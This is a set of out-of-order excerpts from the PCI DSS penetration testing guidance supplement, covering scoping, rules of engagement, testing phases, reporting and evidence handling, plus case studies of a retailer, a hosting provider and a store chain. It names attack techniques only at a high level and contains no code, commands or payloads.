This section provides guidance for these activities and is organized by the typical phases that occur during a penetration test: pre-engagement, engagement, and post-engagement. 4.1 Pre-Engagement Before the engagement or testing begins, it is recommended that all parties involved (the organization, the tester, and where applicable, the assessor) be informed of the types of testing (i.e., internal, external, application-layer or network-layer) to be performed, how testing will be performed, and what the testing will target. By coordinating these details first, issues where the CDE scope is defined improperly or other issues arise that would require a retest might be avoided. This information may be gathered by conducting a pre- engagement call or during an on-site pre-engagement meeting. 4.1.1 Scoping The organization being assessed is responsible for defining the CDE and any critical systems. It is recommended that the organization work with the tester and, where applicable, the assessor to verify that no components are overlooked and to determine whether any additional systems should be included in scope. The scope of the penetration test should be representative of all access points, critical systems, and segmentation methodologies for the CDE. 4.1.2 Documentation Whenever possible, detailed documentation of any components within the scope should be made available to the tester. Common examples of such documents are application-interface documentation and implementation guides. This information will ensure the tester understands how functionality should work and whether results received are expected for the given scenario. As a part of the scoping process, the organization should consider supplying the tester with the following documentation:  A network diagram depicting all network segments in scope for the test (Refer to PCI DSS Requirements 1.1.2 and 1.1.3.)  Cardholder data flow diagram  A list of all expected services and ports exposed at the CDE perimeter  Details of how authorized users access the CDE  A list of all network segments that have been isolated from the CDE to reduce scope The penetration tester will use this information during the assessment to identify unexpected attack vectors of the CDE in addition to known attack vectors, insufficient authentication controls, and to confirm the proper segmentation of out-of-scope environments.

Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed and the degree of exploitation, if any, that is permitted. This authorizes the tester to test the environment and ensure the organization understands what to expect from the penetration test. Below are some examples of considerations that may be included in the rules of engagement:  During what time window will testing need to be performed?  Are there any legacy systems that have known issues with automated scanning? If so, how should testing be performed against these systems?  Is there a preferred method of communicating about scope and issues encountered during the engagement?  Does the entity want updates regarding ongoing exploitation of systems during the test? If so, the entity will need to determine whether they will or will not act upon such information or make changes to the environment. The entity may also want to implement its incident response plan in response to an exploit.  Are there security controls that would detect or prevent testing? Consider whether these should be disabled or configured to not interfere during testing. (See Section 4.1.7 for further guidance.)  If passwords or other sensitive data are compromised during the testing, does the tester need to disclose a list of all passwords and/or sensitive data accessed?  If equipment owned by the tester is to be connected to the organization’s network, what steps must be taken to ensure the equipment does not pose a threat to the environment (updated to the latest operating system, applied service packs and/or patches, etc.)?  Does the tester need to provide all IP addresses from which testing will originate?  Will sensitive data shown to be accessible during the test be retained by the tester during and after the penetration test? Only a proof-of-concept test should be performed, any cardholder data obtained must be secured in accordance with PCI DSS. (See Section 4.2.4 for more guidance.)  What steps will be taken if the tester detects a previous or active compromise to systems being tested? (For example, activate incident response procedures and stop penetration test until resolution of the compromise situation.) The intent of this document is to provide supplemental information.

The scope may include any systems managed, built, or",

The scope may include any systems managed, built, or utilized by the organization.  Unless otherwise noted in the scope, web-management portals provided by the third party for the entity to manage its infrastructure should not be included in the penetration test—these interfaces should be tested and validated as part of the third party’s PCI DSS compliance efforts, and evidence or attestation of validation should be provided to the customer. 4.1.5 Success Criteria The intent of a penetration test is to simulate a real-world attack situation with a goal of identifying how far an attacker may be able to penetrate into the environment. Defining the success criteria for the penetration test allows the entity to set limits on the depth of the penetration test. Without agreeing upon the point at which the penetration test is complete, there is a possibility of the tester exceeding the boundaries and expectations of the target entity. This should be documented in the rules of engagement. Possible success criteria may include:  Direct observation of restricted services or data in the absence of expected access controls  Compromise of an intermediary device used by privileged users to access the CDE  Compromise of the domain used by privileged users  No compromise of the target systems The success criteria will be different for every environment and should be established during initial pre- engagement meeting prior to testing. 4.1.6 Review of Past Threats and Vulnerabilities PCI DSS Requirement 11.3 requires a review and consideration of threats and vulnerabilities encountered by the assessed entity within the past 12 months. This is an historical look at real vulnerabilities experienced or discovered in the entity’s environment since the last assessment. This information may provide insight to the process in place to handle these vulnerabilities. The intent of this document is to provide supplemental information. Information provided here does not 16\\nThe penetration tester should be familiar with current vulnerabilities seen by the industry over the past 12 months as well as take a detailed look at recent vulnerabilities experienced by the entity. Depending on the type of test to be performed (i.e., white box, grey box, black box), the following may or may not be considered in such a review:  Vulnerabilities discovered by the entity which have not been remediated within the time period required by PCI DSS (example: quarterly), and/or by the vulnerability remediation requirements documented in the corporate security policy  Existing compensating controls mitigating the noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking",

In many environments, active protection controls such as an intrusion prevention system or web active protection systems such as intrusion protection systems (IPS) and web application firewalls (WAF) may be deployed to protect exposed services. Because the intent of the penetration test is to evaluate the services’ susceptibility to exploitation (vs. the active protection systems’ ability to prevent attacks), interference with the penetration test should be avoided—entities are encouraged to review and be familiar with the section titled “Scan Interference” in the ASV Program Guide and configure active protection systems accordingly during testing. This practice helps ensure that the services themselves are configured properly and have the minimal risk of being exploited in the event the active protection system fails or is somehow defeated or bypassed by an attacker. 4.2 Engagement: Penetration Testing Each environment has unique aspects/technology that requires the tester select the most appropriate approach and the tools necessary to perform the penetration test. It is beyond the scope of this document to define or outline which approach, tools, or techniques are appropriate for each penetration test. Instead, the following sections provide high-level guidance on considerations for the approach, tools, or techniques. The intent of this document is to provide supplemental information. Information provided here does not 17\\nPenetration testing is essentially a manual endeavor. In many cases, tools exist that can aid the tester in performing the test and alleviate some of the repetitive tasks. Judgment is required in selecting the appropriate tools and in identifying attack vectors that typically cannot be identified through automated means. Penetration testing should also be performed from a suitable location, with no restrictions on ports or services by the Internet provider. For example, a penetration tester utilizing Internet connectivity provided to consumers and residences may have SMTP, SNMP, SMB, and other ports restricted by the Internet provider to minimize impact by viruses and malware. If testing is performed by a qualified internal resource, the test should also be performed from a neutral Internet connection unaffected by access controls that might be present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will",

The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will allow the tester to determine if, at any given role, the user could escalate privileges or otherwise gain access to data they are not explicitly allowed to access. In instances where the organization has created new accounts for the tester to use, it is important that the organization ensure all roles and applicable security in the application have been set up to allow the tester to effectively test all functionality. In instances where a web application utilizes a back-end API, the API may be in scope for the testing. The tester should understand the interaction between the web application and the backend, the functionality exposed by the API, as well as any security controls implemented to protect access to the API. Those, and other factors, will help determine whether the back-end API should be tested independently from the web application. 4.2.2 Network Layer Since most protocols are well defined and have standard modes of interaction, network-layer testing is more suitable for automated testing. This makes automation the first logical step in a network-layer test. Because of such standardization, tools may be used to quickly identify a service, the version of the software, test for common misconfigurations, and even identify vulnerabilities. Automated tests can be performed much faster than could be expected of a human. However, simply running an automated tool does not satisfy the penetration testing requirement. Automated tools cannot interpret vulnerabilities, misconfigurations, or even the services exposed to assess the true risk to the environment. The automated tool only serves as a baseline indication of the potential attack surface of the environment. The penetration tester must interpret the results of any automated tools and determine whether additional testing is needed. Using the documentation provided by the organization during the pre-engagement, the tester should:  Verify that only authorized services are exposed at the CDE perimeter.  Attempt to bypass authentication controls from all network segments where authorized users access the CDE, as well as segments not authorized to access the CDE. The intent of this document is to provide supplemental information. Information provided here does not 18\\n4.2.3 Segmentation The segmentation check is performed by conducting tests used in the initial stages of a network penetration test (i.e., host discovery, port scanning, etc.). It should verify that all out-of-scope LANs truly have no access to the CDE. For environments with a large number of network segments considered to be out of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the",

Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the segmentation check that a LAN segment thought to be out of scope has access into the CDE, the organization will either need to adjust the segmentation controls to block that access, or perform a full network-layer penetration test to characterize the access and the impact on PCI DSS scope. 4.2.4 What to do when cardholder data is encountered If cardholder data is accessed during the penetration test, it is important that the tester notify the organization immediately. The tester should keep detailed documentation as to exactly what data was accessed and how it was accessed. After being notified, the organization should immediately review how the cardholder data was retrieved and, as appropriate, should take steps to execute its incident response plan. If the output of testing tools or activities includes cardholder data that was accessed by the tester during the engagement, it is important this output be secured in accordance with PCI DSS. 4.2.5 Post-Exploitation The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation or pivoting techniques—which allows the tester, in this case, to establish a new source of attack from the new vantage point in the system—to gain additional access to systems or network resources. Penetration testers should be able to demonstrate the risk presented by exploitable systems to the CDE and what post-exploitation may likely occur with those systems. 4.3 Post-Engagement After the engagement or testing has been performed, there are activities both parties should carry out. 4.3.1 Remediation Best Practices Penetration testing efforts, while thorough, may not always guarantee exhaustive identification of every instance where a security control’s effectiveness is insufficient—e.g., finding a cross site scripting vulnerability in one area of an application may not reveal all instances of this vulnerability in the application. Often the presence of vulnerability in one area may indicate weakness in process or development practices that could have replicated or enabled similar vulnerability in other locations. Therefore, it is important for the tested entity to carefully investigate systems or applications with the ineffective security controls in mind when remediating. The intent of this document is to provide supplemental information. Information provided here does not 19\\n4.3.2 Retesting Identified Vulnerabilities The organization should take steps to remediate any exploitable vulnerability within a reasonable period of time after the original test. When the organization has completed these steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported.

In specific conditions, the flagged security issue may represent a fundamental flaw in an environment or application. The scope of a retest should consider whether any changes occurring as a result of remediation identified from the test are classified as significant. All changes should be retested; however, whether a complete system retest is necessary will be determined by the risk assessment of those changes. 4.3.3 Cleaning up the Environment It is important for the tester to document and disclose to the organization any alterations made to the environment (as permitted in the Rules of Engagement) during the test, including but not limited to:  Accounts that were created as a part of the assessment either by the entity or the tester: the organization should then remove these accounts.  Tools installed by the tester on the organization’s systems: these tools should be removed at the end of the testing. Removal of accounts and test tools will ensure the accounts or remnant tools could not be exploited or used against the organization. 4.4 Additional Resources There are multiple industry-accepted methodologies that may provide additional guidance on penetration testing activities, including but not limited to:  Open Source Security Testing Methodology Manual (“OSSTMM”)  The National Institute of Standards and Technology (“NIST”) Special Publication 800-115  OWASP Testing Guide  Penetration Testing Execution Standard  Penetration Testing Framework The intent of this document is to provide supplemental information. Information provided here does not 20\\n5 Reporting and Documentation The purpose of the report is to assist the organization in its efforts to improve its security posture by identifying areas of potential risk that may need to be remediated. Merely reporting lists of vulnerabilities is not helpful in this endeavor and does not meet the intent of the penetration test. The report should be structured in a way to clearly communicate what was tested, how it was tested, and the results of the testing. This section provides guidance on documenting identified and/or exploited vulnerabilities, creating reporting templates, and evaluating a penetration test report. 5.1 Identified Vulnerability Reporting Penetration test reports should include a discussion of the steps, vectors, and exploited vulnerabilities that lead to penetration during testing for which remediation and retesting are required. However, it is possible for the tester to identify vulnerabilities that were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not",

It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not exploited for valid reasons and should be included in the report may be:  Firewall misconfigurations that permit unauthorized traffic between secure and insecure zones  Detection of credentials obtained through manipulation of a web-application error message that was not flagged during an ASV scan due to a low CVSS base score 5.1.1 Assigning a Severity Score In order to prioritize remediation of the penetration test findings, it is a common practice during the reporting phase for a severity or risk ranking to be assigned for each detected security issue. The report should clearly document how the severity/risk ranking is derived. In most cases, severity/risk ranking may be applied as a result of evaluating an industry-standard score (e.g., NVD, CVSS) against a threshold or value that indicates risk (i.e., high, medium, and low). However, it should be noted that it is possible for a vulnerability to exist that is inherent to a particular environment; therefore, a standardized score is not available. When custom scoring is part of the risk-ranking process, the report should reflect a traceable set of reasoning for the modification of industry-standard scores or, where applicable, for the creation of a score for a vulnerability that does not have an industry-standard score defined. The intent of this document is to provide supplemental information. Information provided here does not 21\\n5.1.2 Industry Standard References Some well-known, industry-standard references include:  National Vulnerability Database (NVD)  Common Vulnerability Scoring System (CVSS)  Common Vulnerabilities and Exposure (CVE)  Common Weakness Enumeration (CWE)  Bugtraq ID (BID)  Open Source Vulnerability Database (OSVDB) The Common Vulnerability Scoring System (CVSS) is an example of an open framework that may be referenced for assigning a baseline risk rating. The CVSS is the required scoring system for Approved Scanning Vendors (ASVs) to use for ranking vulnerabilities detected during PCI vulnerability scans. Using this system, a standardized vulnerability score can be adjusted through the evaluation of the traits of vulnerability within the context of a specific environment. 5.2 Reporting Guidelines Comprehensive and consistent reporting is a critical phase of a penetration test. This section provides guidelines on common contents of an industry standard penetration test. It should be noted that these are only suggested outlines and do not define specific reporting requirements for PCI DSS penetration tests. Testers may have different sections, alternative titles, and/or report format, etc.; this outline represents data gathered from a number of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the",

Provide directions on how cleanup should be performed and how to verify security o controls have been restored. 5.2.2 Retesting Considerations and Report Outline If the noted findings will require remediation and retesting before an assessor can determine the entity has met PCI DSS Requirement 11.3, a follow-up test report may be provided. All remediation efforts should be completed and retested within a reasonable period of time after the original penetration test report was provided. It is expected that the remediation test report will cover all identified/exploitable vulnerabilities that require remediation.

A typical penetration test involves obtaining and evaluating evidence using a formal methodology; evidence collected from the penetration test is used to determine the conclusion. Evidence is considered all information that supports the penetration tester’s conclusions about the effectiveness of the security controls and the environment’s overall security posture. The penetration tester should follow a systematic process to securely collect, handle, and store evidence. Examples of evidence include but are not limited to screenshots, raw tool output (i.e., NMAP, burp suite, Nessus, TCPDump Wireshark, etc.), acquired dumps in case of exploitation (i.e., database files, logs, configuration files etc.), photos, recordings, and anything that may support the final conclusion of the penetration test report. It should be noted that if cardholder data is acquired during the penetration test, it is recommended that it be kept to a minimum. For example, a database full of cardholder data should not be dumped to the tester’s machine or system. 5.3.2 Retention It is recommended that procedures for retention and destruction of evidence be documented for all parties involved prior to commencing the penetration test. If a third party is used to perform the penetration test, contract language should be reviewed to confirm these procedures are clear. While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that such evidence be retained by the tester (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement. If, however, a tester stores cardholder data obtained during the engagement, the data must be stored by the tester following the guidelines of the PCI DSS for the storage of account data—i.e., encrypted using strong cryptography, truncated/hashed, or not stored. Storage of account data by the tester is not recommended. This data should be securely wiped from tester systems at the conclusion of the engagement.

Client has three unique brands running on multiple e-commerce web sites. Brand A runs on a third-party e-commerce platform written using a Java platform with Apache Tomcat and IBM’s DB2 database and utilizes a content-delivery network for image distribution. Brand B and Brand C utilize an in-house coded e-commerce shopping cart written in ColdFusion with Microsoft SQL and share the same underlying code. All brands submit cardholder data for processing over HTTPS. All sites are hosted at a third-party hosting provider on dedicated systems. The Client’s firewalls have integrated intrusion prevention features. Client has exclusive control of the code and the content. Product Managers update product information using staging servers in the corporate environment, and the updates are promoted to production by IT support staff. Client has full control of DNS. Description of Environment The environment for Brands A, B, and C is comprised of five networks. The web DMZ contains the firewalls, DNS servers, load balancers, and web servers for all brands. Only the load balancers are NAT’d and have publicly routable IP addresses. The application tier contains the Apache Tomcat and ColdFusion middleware servers. It is segmented from the DMZ and database tiers using firewall access controls. The database tier contains the Microsoft SQL and IBM DB2 servers. It is segmented from the application tier using firewall access controls. The management network is used for backups, patch-management servers, NTP Servers, network-traffic analysis devices, and syslog collectors. The management network is accessible using jump boxes with two-factor authentication from the corporate network over a point-to-point VPN. Pre-Engagement Activities (Planning) Once the engagement is confirmed, the Pen Test Company scheduled a kick-off call and provided the Client with a testing questionnaire and test-authorization form to be completed before the next meeting. The kick-off call is generally used to review the rules of engagement, define the success criteria, and review the methodology to be used. An examination of this type could be conducted in accordance with information system security assessment best practices such as described by the Open Source Security Testing Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0.

In this case, all external IPs used for the DMZ and web tier were included in the scope. This would include all systems that directly store, process, or transmit cardholder data. Because the Client has full control and full responsibility for its security, the DNS server was included in the scope of the test to determine whether an attacker could compromise the server and redirect traffic intended for the Client’s sites to a malicious intermediary or fraudulent site. The image CDN servers were determined out of scope because no PAN data is transmitted or processed and the systems are otherwise fully segmented. The staging systems are unavailable from the Internet and therefore cannot be tested. The web applications for Brand A and Brand B will be completely in scope. The web application for Brand C is presumed to be an exact copy, exclusive of product information and look and feel. The tester will sample the web application for Brand C to verify that the applications are the same as Brand B. If it is determined that there are material differences between Brand B and Brand C web applications, Brand C will be brought fully into scope. The Client and Pen Test Company have agreed that testing will be conducted against the production systems, as no suitable staging or review system is publicly available. Because of this limitation, testing must be performed with the intrusion prevention system enabled. However, because the timeline for testing cannot accommodate the time required to use techniques that might bypass the IPS, the Client has agreed to remove any blocks enabled by the system during testing. For this engagement the Client has requested that additional rules of engagement include that testing be limited to non-peak hours, and any attempts to run exploit code on the remote systems be performed only after notifying the Client. Also, any accounts created by the tester or successful orders placed in the system must be identified at the end of each day’s testing. All parties have agreed that no further testing is required if the penetration tester is able to extract data from either of the databases or obtain shell access on any server in the web farm. Engagement Phase (Discovery and Attack/Execution) The penetration tester began by comparing the scope provided by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases.

The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence (OSINT) gathering is an important next step in confirming scope and determining that all the appropriate assets have been included in the test. Newly discovered assets were vetted by the Client to determine whether they should be included in the penetration test. During this phase of the assessment, an additional disaster recovery site was identified in DNS, and Client confirmed this to be a warm backup in the event of failure of the primary sites. All relevant assets were added to the scope. The intent of this document is to provide supplemental information. Information provided here does not 28\\nOnce the assets were confirmed, the penetration tester enumerated the publicly available services provided by the targets. The tester actively tried to obtain usernames, network-share information, and application- version information of all running services and applications. In this phase, the penetration tester began to spider and map the applications, with and without credentials, in preparation for the exploitation phase. The tester was provided with the ability to complete a full transaction all the way through checkout and order confirmation. With target enumeration complete, the tester performed vulnerability mapping of identified services using automated tools and by comparing the port and service fingerprint against well-known vulnerability databases. This produced a list of unconfirmed vulnerabilities that were further examined in the exploitation phase of testing. The exploitation phase included tests and techniques designed to meet the objectives of the test. (These must be exploitive and may also be used to confirm the effectiveness of ancillary security controls such as intrusion detection systems or web application firewalls.) It was during this step that testing of the applications for issues related to the OWASP Top 10 and other web application frameworks took place. The final phase of testing included post-exploitation techniques. The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation techniques to gain additional access to systems or network resources. The extent to which post-exploitation techniques were performed were defined prior to the start of test to prevent the tester from putting production systems at risk of destabilization. Main vulnerabilities identified were: High:  Apache Tomcat Manager Application Deployer Authenticated Code Execution  Cross-site scripting (reflective)  Directory traversal Medium:  Deprecated protocols - SSLv2, SSLv3  SSL weak ciphers  Internal IP address disclosure Low:  IPS not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report.

The intent of this document is to provide supplemental information. Information provided here does not 29\\nThe penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was noted that the denial-of-service attack and missing IPS, while serious issues for a retailer, were not PCI-relevant findings and would not be required in order to obtain a clean report. The Client corrected all High and Medium-severity vulnerabilities within a 90-day window and the Pen Test Company provided documentation of successful remediation to the Client. 6.2 Hosting Provider Penetration Test Case Study Case Introduction PCIData Hosting is a hosting service provider. The only cardholder data environment that exists within PCIData Hosting belongs to its PCI DSS compliant customer, TechMerchant. TechMerchant is operating an e-commerce web environment on the PCIData hosting hardware. TechMerchant is solely responsible for the administration and maintenance of all the software and applications used to support its e-commerce environment. PCIData Hosting is bound by contract with TechMerchant to maintain PCI Compliance. PCIData Hosting is required to maintain PCI Compliance by TechMerchant since PCIData Hosting provides critical security services to TechMerchant for its PCI DSS compliance. In addition, PCIData Hosting has a wish to extend this type of PCI DSS hosting service to more customers in the payment card industry. PCIData Hosting is managing the systems in the cardholder data environment and is responsible for physical security, hardware, network, firewalls, and OS including updates, configuration etc. Applications and databases are not the responsibility of PCIData Hosting. Storing, processing, and transmitting cardholder data are in TechMerchant’s scope and have been described and assessed in its own PCI DSS Assessment. PCIData Hosting has no type of cardholder data transactions in scope, and the only entity hosted from a PCI perspective is TechMerchant, for whom they only provide hardware hosting services and logical system management. Description of Environment The environment at PCIData Hosting consists of five different networks:  ODIN Network Zone: Only VMware Hypervisors used for the TechMerchant CDE servers and environment are hosted in this network segment. This network is not accessible from the THOR network.  THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed",

The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed at TechMerchant.  LOKE Network Zone: Guest network used for external consultants, other guests, BYOD devices, etc. This is the only network that has wireless access points connected. The intent of this document is to provide supplemental information. Information provided here does not 30\\n HEJMDAL Network Zone: Management network from which PCIData Hosting manages the different client networks that do not fall into PCI scope. This network is only used to manage non- CDE servers.  BALDER: All other clients are hosted on this network, including PCIData Hosting’s own office network. All networks are separated by firewalls, and access to ODIN and THOR network segments is restricted to two-factor authentication. The only wireless network is connected to LOKE (the guest network). The datacenter is located at PCIData Hosting’s location and is also in scope for PCI compliance. High-Level Network Diagram Success Criteria – The success criteria for the penetration test is to gain access to the CDE. Resource List (CDE environment)  ODIN – VMware servers  THOR – UNIX-based servers including webservers; Oracle databases in a secure zone  All employees at PCIData Hosting use Microsoft-based workstations to access the CDE environment. Pre-Engagement Actives (Planning) The methodology used for the penetration test was based on NIST SP800-115; the penetration test included the following phases: Planning, Discovery, Attack/Execution, Post-Execution and Reporting. The intent of this document is to provide supplemental information. Information provided here does not 31\\nThe planning phase was used to gather information needed for the assessment execution—such as the assets to be assessed, the threats of interest against the assets, and the security controls to be used to mitigate those threats—and to develop the assessment approach. The networks ODIN (VMware) and THOR (CDE Servers) are the targets of the penetration test as these servers are those that store, process, and transmit cardholder data. Scoping Discussion It was discussed with PCIData Hosting how they managed their CDE environment, including servers and databases. The operating systems are administrated by PCIData Hosting; all applications and development are handled by TechMerchant. Both PCIData Hosting and TechMerchant administer databases. Encrypted information in the database is only accessible with the encryption keys that are held by TechMerchant. All access to ODIN and THOR are authenticated by a two-factor solution. This also applies when accessed from internal networks at PCIData Hosting. TechMerchant’s last penetration test was reviewed to make sure that all perimeters, servers, etc. were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing.

The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the TechMerchant’s last penetration test  Security policies  Review of PCIData Hosting’s risk analysis. The following tests were performed during the assessment:  Internal penetration tests from LOKE (guest network), HEJMDAL (management network) and from the office network located in BALDER (Client).  Social engineering against PCIData Hosting administrators of ODIN (VMware) and THOR (CDE servers) in form of phishing e-mails  Physical security assessment as a part of the penetration test.  External testing of PCIData Hosting of their external IP-addresses. All servers, databases, employees with access to the CDE, etc. are considered in scope for the penetration test. The intent of this document is to provide supplemental information. Information provided here does not 32\\nPre-Test Preparations A user account was created for the penetration tester following the regular procedures for granting access to new employees. Access credentials for the guest network were also granted to the tester. Engagement Phase (Discovery and Attack/Execution) Discovery was performed on the LOKE (guest), HEJMDAL (management) and BALDER (office) networks to identify targets (servers, network components, workstations, etc.) on the networks, and analyzing techniques were used to get an understanding of the environment. The objectives of this phase were to identify systems, ports, services, and potential vulnerabilities. This phase was performed both manually and via automated tools including network discovery and port and service detection. When enough data was collected in the discovery phase, the penetration tester tried to gain access to the targets discovered. When access was gained to targets the tester tried to escalate privileges in order to gain complete control of the target. The access obtained was then used to gain more information about the environment, and a new discovery phase was started. The primary goal for the discovery and attack/execution was gaining access to the CDE, including the VMware hosts. The techniques used included password cracking, vulnerability scanning, social engineering, and network-layer testing. The above was completed for the following different perspectives during the assessment:  External attacker without knowledge of the environment  Internal attacker (guest, contractor, etc.)  Internal attacker (employee without access to the CDE) The following tests were performed during the assessment:  External attacker without knowledge of the environment External VPN connection was tested. o Phishing e-mails were sent to carefully selected victims who all are working with administrating o the CDE environment.

Information provided here does not 33\\nVulnerabilities were found on the different networks, and the tester was able to exploit these but was not able to use the vulnerabilities to gain access to ODIN or THOR. Main vulnerabilities identified were:  Man in the middle – It was possible to perform a man-in-the-middle attack using ARP poisoning but the tester was not able to extract any sensitive information that could provide information on how to gain access to ODIN or THOR.  Weak password policy implemented – Weak password settings on local servers on the BALDER network were used to compromise accounts on this network. The tester was not able to use these accounts to gain access to ODIN or THOR. As these servers are not in PCI scope, the weak password policy was not considered to have an impact on compliance.  Old user accounts were compromised – The tester was able to compromise user accounts that were created but had never been in use on the BALDER network. The compromised accounts did not grant access to ODIN or THOR.  Others – Other vulnerabilities were noted as zone transfer, outdated software, unencrypted protocols used; these vulnerabilities were all related to LOKE or BALDER network and did not grant access to ODIN or THOR even when exploited. Post-Engagement (Post-Execution phase) The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though they did not have an impact on the cardholder data environment. The penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was confirmed that none of the vulnerabilities had an effect on the cardholder data environment. As no significant vulnerabilities related to the CDE environment were discovered and access to the CDE environment was not obtained, remediation testing was not performed.

Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to a local server at each store before being sent out to the processor. No cardholder data is transmitted between stores or back to corporate. After receiving a confirmation from the processor, cardholder data is purged from the POS server. The POS server runs a PA-DSS point-of-sale application. Corporate has a persistent VPN connection into each of the store locations to allow for administration of networked resources, accessing CCTV recordings, and checking inventory. Description of Environment The environment at Green Clothing consists of six store locations and one corporate office. All stores were determined to be identically configured and have been segmented into two networks:  POS Network – Cardholder Data Environment (CDE) 2 POS devices o 1 POS server o  General Store Network (Non-CDE) 1 manager workstation o 1 CCTV server o Corporate is made up of two network segments:  Corporate General User Network (Non-CDE) 4 workstations o 1 wireless access point o  Corporate IT Management Network (Non-CDE) o 3 workstations used to manage CDE servers The intent of this document is to provide supplemental information.

The guidance focuses on the following:  Penetration Testing Components: Understanding of the different components that make up a penetration test and how this differs from a vulnerability scan including scope, application and network-layer testing, segmentation checks, and social engineering.  Qualifications of a Penetration Tester: Determining the qualifications of a penetration tester, whether internal or external, through their past experience and certifications.  Penetration Testing Methodologies: Detailed information related to the three primary parts of a penetration test: pre-engagement, engagement, and post-engagement.  Penetration Testing Reporting Guidelines: Guidance for developing a comprehensive penetration test report that includes the necessary information to document the test as well as a checklist that can be used by the organization or the assessor to verify whether the necessary content is included. The information in this document is intended as supplemental guidance and does not supersede, replace, or extend PCI DSS requirements. The current version of PCI DSS at the time of publication is v3.2; however, the general principles and practices offered here may also be applicable to other versions of PCI DSS. 1.2 Intended Audience This guidance is intended for entities that are required to conduct a penetration test whether they use an internal or external resource. In addition, this document is intended for companies that specialize in offering penetration test services, and for assessors who help scope penetration tests and review final test reports. The guidance is applicable to organizations of all sizes, budgets, and industries. 1.3 Terminology The following terms are used throughout this document:  Application-layer testing: Testing that typically includes websites, web applications, thick clients, or other applications.  Black-box testing: Testing performed without prior knowledge of the internal structure/design/implementation of the object being tested.  Common Vulnerability Scoring System (CVSS): Provides an open framework for communicating the characteristics and impacts of IT vulnerabilities.  Grey-box testing: Testing performed with partial knowledge of the internal structure/design/implementation of the object being tested. The intent of this document is to provide supplemental information. Information provided here does not 4\\n National Vulnerability Database (NVD): The U.S. government repository of standards based vulnerability management data. This data enables automation of vulnerability management, security measurement, and compliance (e.g., FISMA).  Network-layer testing: Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity.

It begins by providing background and definitions for topics common to all penetration test efforts (including scoping the test, critical systems to test, application and network-layer test inclusions, etc.). The document then moves on to practical guidance on selecting a penetration tester, methodologies that are used before, during, and after a test, guidelines for reporting and evaluating test results. The document concludes with case studies that attempt to illustrate the concepts presented in this supplement. Appendix A provides a quick-reference table to specific sections of this document where guidance on a particular PCI DSS requirement can be found. This may be useful for those wishing to quickly correlate the penetration testing requirements and guidelines presented in PCI DSS Requirement 11.3. The intent of this document is to provide supplemental information. Information provided here does not 5\\n2 Penetration Testing Components The goals of penetration testing are: 1. To determine whether and how a malicious user can gain unauthorized access to assets that affect the fundamental security of the system, files, logs and/or cardholder data. 2. To confirm that the applicable controls required by PCI DSS—such as scope, vulnerability management, methodology, and segmentation—are in place. There are three types of penetration tests: black-box, white-box, and grey-box. In a black-box assessment, the client provides no information prior to the start of testing. In a white-box assessment, the entity may provide the penetration tester with full and complete details of the network and applications. For grey-box assessments, the entity may provide partial details of the target systems. PCI DSS penetration tests are typically performed as either white-box or grey-box assessments. These types of assessments yield more accurate results and provide a more comprehensive test of the security posture of the environment than a pure black-box assessment. Performing a black-box assessment, when the entity provides no details of the target systems prior to the start of the test, may require more time, money, and resources for the deliverables to meet the requirements of PCI DSS. 2.1 How does a penetration test differ from a vulnerability scan? The differences between penetration testing and vulnerability scanning, as required by PCI DSS, can be summarized as 